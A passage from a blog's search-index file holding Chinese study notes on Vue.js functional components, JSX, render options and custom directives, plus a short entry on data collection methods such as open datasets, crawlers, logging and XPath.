提供两个参数：</p><ul><li><code>function</code>参数，值为<code>true</code>,使组件无状态和无实例（没有 <code>data</code> <code>this</code> 上下文），这样 render 函数返回的虚拟节点更容易渲染。</br></li><li><code>context</code>参数，提供临时上下文，组件需要的 <code>data</code>、<code>props</code>、<code>slots</code>、<code>children</code>、<code>parent</code> 都是通过这个上下文来传递。（比如：<code>this.level =&gt; contex.props.level</code>）</li></ul><p><strong>根据 button 选择不同组件的场景</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div#app</span><br><span class="line">    smart-item[:data=&quot;data&quot;]</span><br><span class="line">    (button[@click=&quot;img|video|text&quot;]&#123;切换为。。&#125;) *3</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ImgItem=&#123;</span><br><span class="line">    <span class="attr">props</span>:[<span class="string">&#x27;data&#x27;</span>],</span><br><span class="line">    <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElement</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>,[</span><br><span class="line">            createElement(<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;图片组件&#x27;</span>),</span><br><span class="line">            createElement(<span class="string">&#x27;img&#x27;</span>,&#123;</span><br><span class="line">                <span class="attr">attrs</span>:&#123;</span><br><span class="line">                    <span class="attr">src</span>:<span class="built_in">this</span>.data.url</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        ])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> VideoItem=&#123;</span><br><span class="line">    <span class="attr">props</span>:[...],</span><br><span class="line">    <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElement</span>)</span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> TextItem=&#123;</span><br><span class="line">    <span class="comment">//这个 data_____  要和 component 的 data_____ 一样</span></span><br><span class="line">    <span class="attr">props</span>:[<span class="string">&#x27;data_____&#x27;</span>],</span><br><span class="line">    <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElement</span>)</span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;smart-item&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">functional</span>:<span class="literal">true</span>,</span><br><span class="line">    <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElement,context</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getComponent</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//根据 context.props.data </span></span><br><span class="line">            <span class="keyword">if</span> (...)  <span class="keyword">return</span> ...Item</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="title">createElement</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            getComponent(),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">props</span>:&#123;</span><br><span class="line">                    <span class="comment">//把 smart-item 的 prop：data 传给上面只能选择的组件</span></span><br><span class="line">                    <span class="attr">data_____</span>: context.props.data</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            context.children</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app=Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">data</span>:&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>:&#123;</span><br><span class="line">        <span class="function"><span class="title">change</span>(<span class="params">type</span>)</span>&#123;</span><br><span class="line">            type==&gt;data:&#123;<span class="attr">type</span>:<span class="string">&#x27;...&#x27;</span>,url|content:<span class="string">&#x27;...&#x27;</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>app</code>定义了<code>data</code>=&gt;传给了组件<code>smart-item</code>=&gt;三个对象都接收一个 <code>prop: data</code><br><br>函数化组件不常用，上例可以用组件的 is 特性来动态挂载。函数化组件主要适用于以下两个场景：</p><ul><li>程序化的在多个组件中选择一个</li><li>在将 children，props，data 传递给子组件之前操作它们</li></ul><h4 id="9-5-JavaScript-的语法扩展：JSX"><a href="#9-5-JavaScript-的语法扩展：JSX" class="headerlink" title="9.5 JavaScript 的语法扩展：JSX"></a>9.5 JavaScript 的语法扩展：JSX</h4><p>在模板比较简单时使用 Render 函数写起来会比较麻烦。解决：提供 插件<code>babel-plugin-transroe-vue-jsx</code>来支持 JSX 语法。<br><br><strong>比较：</strong></p><ul><li>template<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Anchor</span> <span class="attr">:level</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>一级<span class="tag">&lt;/<span class="name">span</span>&gt;</span>标题</span><br><span class="line"><span class="tag">&lt;/<span class="name">Anchor</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>Render -&gt; createElement 改写<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> createElement(<span class="string">&#x27;Anchor&#x27;</span>,&#123;</span><br><span class="line">    prop<span class="variable">s:</span>&#123;</span><br><span class="line">        leve<span class="variable">l:1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,[</span><br><span class="line">    createElement(<span class="string">&#x27;span&#x27;</span>,<span class="string">&#x27;一级&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;标题&#x27;</span></span><br><span class="line">])</span><br></pre></td></tr></table></figure></li><li>Render -&gt; 使用 JSX 语法<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  需要在 webpack 里配置插件 bebel-plugin-tranform-vue-jsx 编译</span></span><br><span class="line"><span class="comment">//  参数 h 不能省略，否则使用时会触发错误</span></span><br><span class="line">    <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">        <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">        <span class="function"><span class="title">render</span>(<span class="params">h</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (</span><br><span class="line">                <span class="xml"><span class="tag">&lt;<span class="name">Anchor</span> <span class="attr">level</span>=<span class="string">&#123;1&#125;</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>一级<span class="tag">&lt;/<span class="name">span</span>&gt;</span>标题</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">Anchor</span>&gt;</span></span></span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></li><li>使用 <code>createElement</code> 常用配置<ul><li>正常实现<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">render(createElement)&#123;</span><br><span class="line">    <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>,&#123;</span><br><span class="line">        props:&#123;</span><br><span class="line">            text:<span class="string">&#x27;some text&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        attrs:&#123;</span><br><span class="line">            <span class="keyword">is</span>:<span class="string">&#x27;myDiv&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        domProps:&#123;</span><br><span class="line">            innerHTML:<span class="string">&#x27;content&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        on:&#123;</span><br><span class="line">            change:<span class="keyword">this</span>.changeHandler</span><br><span class="line">        &#125;,</span><br><span class="line">        nativeOn:&#123;</span><br><span class="line">            click:<span class="keyword">this</span>.clickHandler</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="class"><span class="keyword">class</span>:<span class="type">&#123;</span></span></span><br><span class="line">            show:<span class="literal">true</span>,</span><br><span class="line">            on:<span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        style:&#123;</span><br><span class="line">            color:<span class="string">&#x27;#fff&#x27;</span>,</span><br><span class="line">            background:<span class="string">&#x27;#f50&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        key:<span class="string">&#x27;key&#x27;</span>,</span><br><span class="line">        ref:<span class="string">&#x27;element&#x27;</span>,</span><br><span class="line">        refInFor:<span class="literal">true</span>,</span><br><span class="line">        slot:<span class="string">&#x27;slot&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>使用 JSX<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">render(h)&#123;</span></span><br><span class="line"><span class="xml">    return (</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">id</span>=<span class="string">&quot;myDiv&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">domPropsInnerHTML</span>=<span class="string">&quot;content&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">onChange</span>=<span class="string">&#123;this.clickHandler&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">nativeOnClick</span>=<span class="string">&#123;this.clickHandler&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">class</span>=</span></span><span class="template-variable">&#123;&#123;<span class="name">show:true</span>,on:<span class="literal">false</span>&#125;&#125;</span><span class="xml"><span class="tag"></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">style</span>=</span></span><span class="template-variable">&#123;&#123;<span class="name">color:</span><span class="string">&#x27;#fff&#x27;</span>,background:<span class="string">&#x27;#f50&#x27;</span>&#125;&#125;</span><span class="xml"><span class="tag"></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">key</span>=<span class="string">&quot;key&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">ref</span>=<span class="string">&quot;element&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">refInFor</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">slot</span>=<span class="string">&quot;slot&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    )</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></li><li>注意：如果项目不是 JSX 强驱动，建议还是以模板 template 的方式为主，特殊场景（比如锚点标题）使用 Render 的 createElement 辅助。</li></ul></li></ul><h4 id="9-6-实战：使用-Render-函数开发可排序的表格组件。"><a href="#9-6-实战：使用-Render-函数开发可排序的表格组件。" class="headerlink" title="9.6 实战：使用 Render 函数开发可排序的表格组件。"></a>9.6 实战：使用 Render 函数开发可排序的表格组件。</h4>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.3 数据采集</title>
      <link href="/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-3-%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/"/>
      <url>/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-3-%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h4 id="如何自动化采集数据"><a href="#如何自动化采集数据" class="headerlink" title="如何自动化采集数据"></a>如何自动化采集数据</h4><p>一个数据的走势，是由多个维度影响的，所以需要通过<strong>多源</strong>的数据采集，收集到尽可能多的<strong>数据维度</strong>，同时保证数据的质量，这样才能得到高质量的数据挖掘结果。</p><p><strong>数据源：</strong></p><ul><li>开放数据源：针对行业的数据库，例如人口信息，地区分布和教育情况，旅游、交通等。</li><li>爬虫抓取(网页、App)：指定网站数据，例如购物网的上的购物评价。</li><li>日志采集(前端采集、后端脚本)：统计用户的操作。可以前端埋点，后端进行脚本收集，来分析网站的访问情况。</li><li>传感器(图像、测速、热敏)：采集物理信息。<span id="more"></span><h5 id="1-开放数据源"><a href="#1-开放数据源" class="headerlink" title="1. 开放数据源"></a>1. 开放数据源</h5></li><li>单位维度(政府、企业、高校)<img src="//tva3.sinaimg.cn/large/005zbIM7ly1g5prkecoi2j30hv0p577w.jpg" alt="img"></li><li>行业维度(交通、金融、能源等领域)<!--more--></li></ul><h5 id="2-使用爬虫"><a href="#2-使用爬虫" class="headerlink" title="2.使用爬虫"></a>2.使用爬虫</h5><p>python爬虫经历的三个过程：</p><ul><li>抓取网页信息(使用 request 爬取内容)</li><li>获取想要的信息(使用 XPath 解析内容)</li><li>保存数据(使用 Pandas 保存爬取的数据，再通过 Pandas 写入 XLS 或 MySQL 等数据库中)。</li></ul><p><code>Selenium + PhantomeJS，Puppteteer</code><br>使用其他工具抓取数据：</p><ul><li>火车采集器</li><li>八爪鱼 (有云采集(付费))</li><li>集搜课</li></ul><h5 id="3-日志采集"><a href="#3-日志采集" class="headerlink" title="3.日志采集"></a>3.日志采集</h5><p><strong>作用：</strong><br>通过分析用户的访问情况，提升系统的性能，从而提高系统的承载量。及时发现系统承载瓶颈，也可以方便技术人员基于用户实际的访问情况进行优化。</p><p><strong>记录的信息：</strong></p><ul><li>谁：用户的IP，用户代理</li><li>什么时候：访问时间，HTTP请求时间？</li><li>通过什么渠道：搜索引擎或者网址输入</li><li>做了什么：执行的操作</li><li>是否有异常：系统是否产生错误</li></ul><p><strong>日志采集的形式：</strong></p><ol><li>通过 Web 服务器采集  (  httpd,Nginx,Tomcat 自带日志记录功能；其他：？Hadoop 的 Chukwa Cloudera 的 Flume Facebook 的 Scribe 等,这些工具均采用分布式架构,能够满足每秒数百 MB 的日志数据采集和传输需求。)</li><li>自定义采集用户行为  （JS代码监听用户的行为，AJAX异步请求后台记录日志）</li></ol><p><strong>埋点是什么？</strong><br>埋点就是在有需要的位置采集相应的信息,进行上报。比如某页面的访问情况,包括用户信息 设备信息;或者用户在页面上的操作行为,包括时间长短等。</p><p><strong>》》》》》其他及思考题。。。未</strong></p><hr><h4 id="实战1：使用八爪鱼采集微博上的-“D-amp-G”-评论"><a href="#实战1：使用八爪鱼采集微博上的-“D-amp-G”-评论" class="headerlink" title="实战1：使用八爪鱼采集微博上的 “D&amp;G” 评论"></a>实战1：使用八爪鱼采集微博上的 “D&amp;G” 评论</h4><h4 id="实战2：自动化下载王祖贤海报"><a href="#实战2：自动化下载王祖贤海报" class="headerlink" title="实战2：自动化下载王祖贤海报"></a>实战2：自动化下载王祖贤海报</h4><h5 id="XPath-定位"><a href="#XPath-定位" class="headerlink" title="XPath 定位"></a>XPath 定位</h5><table><thead><tr><th>表达式</th><th>含义</th></tr></thead><tbody><tr><td>node</td><td>选node节点的所有子节点</td></tr><tr><td>/</td><td>从根节点选取</td></tr><tr><td>//</td><td>选取所有的当前节点</td></tr><tr><td>.</td><td>当前节点</td></tr><tr><td>..</td><td>父节点</td></tr><tr><td>@</td><td>属性选择</td></tr><tr><td></td><td></td></tr><tr><td>text()</td><td>当前路径的文本内容</td></tr></tbody></table><ul><li>选择 node 节点的所有节点  <code>xpath(&#39;node&#39;)</code></li><li>回到上一个节点   <code>xpath(&#39;...&#39;) </code></li><li>所有book元素，且book元素拥有id=”abc”的属性。   <code>xpath(&#39;//book[@id=&quot;abc&quot;])</code></li><li>选取book元素的所有 title 和 price 元素。  <code>xpath(&#39;//book/title|//book/price&#39;)</code></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.自定义指令</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/8-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/8-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="8-1-基本用法"><a href="#8-1-基本用法" class="headerlink" title="8.1 基本用法"></a>8.1 基本用法</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>全局注册</span><br><span class="line">Vue.directive(<span class="string">&#x27;forcus&#x27;</span>,&#123;</span><br><span class="line">    <span class="regexp">//</span>指令选项</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>局部注册</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    directives:&#123;</span><br><span class="line">        focus:&#123;</span><br><span class="line">            <span class="regexp">//</span>指令选项</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><span id="more"></span><p>自定义指令的选项是由几个钩子函数组成的。</p><ul><li><strong><code>bind:</code></strong> 只调用一次，指令第一次绑定到元素时调用，用这个钩子函数可以定义一个在绑定时执行一次的初始化动作．</li><li><strong><code>inserted:</code></strong> 被绑定元素插入父节点时调用（父节点存在即可调用，不必存在于 document 中）。</li><li><strong><code>update:</code></strong> 被绑定元素所在的模板更新时调用，而不论绑定值是否变化。通过比较更新前后的绑定值，可以忽略不必要的模板更新。</li><li><strong><code>componentUpdated:</code></strong> 被绑定元素所在模板完成一次更新周期时调用。</li><li><strong><code>unbind:</code></strong> 只调用一次，指令与元素解绑时调用 。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//directive: focus   v-focus (自动加V)</span></span><br><span class="line">div<span class="comment">#app </span></span><br><span class="line">    input[type=<span class="string">&quot;text&quot;</span>][v-focus]</span><br><span class="line">script</span><br><span class="line">    Vue.directive(<span class="string">&#x27;focus&#x27;</span>,&#123;</span><br><span class="line">        inservted:<span class="function"><span class="keyword">function</span>(<span class="params">el</span>)</span>&#123;</span><br><span class="line">            el.focus();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">        el:<span class="string">&#x27;#app&#x27;</span></span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>每个钩子函数都有几个参数可用：</p><ul><li><strong><code>el:</code></strong> 指令绑定的元素，可以用来直接操作DOM</li><li><strong><code>binding:</code></strong> 一个对象，包含以下属性：<ul><li><strong><code>name</code></strong> 指令名，不包括 <code>v-</code> 前缀。</li><li><strong><code>value</code></strong> 指令的绑定值，例如 v-my-directive＝”1 + 1 “，value 的值是2 </li><li><strong><code>oldValue</code></strong> 指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用．无论值是否改变都可用。</li><li><strong><code>expression</code></strong> 绑定值的字符串形式 。 例如 v-my-directive=”1 + 1”, expression 的值是”1 + 1”。</li><li><strong><code>arg</code></strong> 传给指令的参数。例如v-my-directive：foo, arg的值是 foo 。</li><li><strong><code>modifiers</code></strong> 一个包含修饰符的对象。 例如 v-my-directive.foo.bar，修饰符对象 modifiers 的值是 {foo: true, bar: true}。</li></ul></li><li><strong><code>vnode</code></strong> Vue编译生成的虚拟节点</li><li><strong><code>oldVnode</code></strong> 上一个虚拟节点仅在 update 和 componentUpdated 钩子中可用。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//绑定时输出一些属性</span></span><br><span class="line">div#app</span><br><span class="line">    div[v-test:msg.a.b=<span class="string">&quot;message&quot;</span>]</span><br><span class="line">script</span><br><span class="line">    Vue.directive(<span class="string">&#x27;test&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">bind</span>:<span class="function"><span class="keyword">function</span>(<span class="params">el,binding,vnode</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> keys=[];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> vnode)&#123;</span><br><span class="line">                keys.push(i);</span><br><span class="line">            &#125;</span><br><span class="line">            el.innerHTML=</span><br><span class="line">                <span class="string">&#x27;name: &#x27;</span>+binding.name+<span class="string">&#x27;&lt;br&gt;&#x27;</span>+</span><br><span class="line">                <span class="string">&#x27;value: &#x27;</span>+binding.value+<span class="string">&#x27;&lt;br&gt;&#x27;</span>+</span><br><span class="line">                <span class="string">&#x27;expression: &#x27;</span>+binding.expression+<span class="string">&#x27;&lt;br&gt;&#x27;</span>+</span><br><span class="line">                <span class="string">&#x27;argument: &#x27;</span>+binding.arg+<span class="string">&#x27;&lt;br&gt;&#x27;</span>+</span><br><span class="line">                <span class="string">&#x27;mpdifiers: &#x27;</span>+<span class="built_in">JSON</span>.stringify(binding.modifiers)+<span class="string">&#x27;&lt;br&gt;&#x27;</span>+</span><br><span class="line">                <span class="string">&#x27;vnode keys: &#x27;</span>+keys.json(<span class="string">&#x27;,  &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">        <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>:&#123;</span><br><span class="line">            <span class="attr">message</span>:<span class="string">&#x27;some text&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>一般在<code>bind</code>钩子里绑定一些时间，比如在 <code>document</code> 上用 <code>addEventListener</code>绑定，在<code>unbind</code>里用<code>removeEventistener</code>解绑。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">div</span><span class="comment">#app </span></span><br><span class="line">    <span class="keyword">div</span>[v-test=<span class="string">&quot;&#123;msg:&#x27;hello&#x27;,name:&#x27;Aresn&#x27;&#125;&quot;</span>]</span><br><span class="line"><span class="keyword">script</span></span><br><span class="line">    Vue.directive(&#x27;test&#x27;,&#123;</span><br><span class="line">        bind:function(el,binding,vnode)&#123;</span><br><span class="line">            console.<span class="built_in">log</span>(binding.value.msg);</span><br><span class="line">            console.<span class="built_in">log</span>(binding.value.<span class="built_in">name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el:&#x27;<span class="comment">#app&#x27;</span></span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h4 id="8-2-实战"><a href="#8-2-实战" class="headerlink" title="8.2 实战"></a>8.2 实战</h4><h5 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h5><p>实现点击空白处关闭菜单<br>index.html , clickoutside.js , style.css</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 